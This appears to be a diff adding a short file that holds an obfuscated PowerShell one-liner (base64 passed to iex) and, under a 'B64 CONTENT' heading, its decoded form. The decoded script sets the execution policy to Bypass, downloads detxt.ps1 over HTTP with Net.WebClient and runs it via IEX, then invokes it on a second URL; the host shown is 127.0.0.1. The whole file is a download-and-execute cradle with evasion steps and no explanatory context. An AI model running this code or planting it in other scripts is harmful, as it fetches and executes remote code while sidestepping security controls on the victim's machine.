@@ -1,0 +1,7 @@
+iex([SySTEM.TeXt.eNCodiNG]::uTf8.getStriNg([sYsTEM.coNverT]::FROmbaSe64stRINg('CmRpciBjOlw7c2xlZXAoNSk7U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3M7c2xlZXAoNSk7ZGlyIGQ6XDtJRVggKChOZXctT2JqZWN0IG5lVC53ZWJjbEllblQpLkRPV05sT0FkU3RSaW5nKCdodHRwOi8vMTI3LjAuMC4xL2RldHh0LnBzMScpICk7ZGlyIGM6XDtkZXR4dCBodHRwOi8vMTI3LjAuMC4xLzEudHh0OwoK')));exit
+
+##### B64 CONTENT #####
+
+
+dir c:\;sleep(5);Set-ExecutionPolicy Bypass -Scope Process;sleep(5);dir d:\;IEX ((New-Object neT.webclIenT).DOWNlOAdStRing('http://127.0.0.1/detxt.ps1') );dir c:\;detxt http://127.0.0.1/1.txt;
+
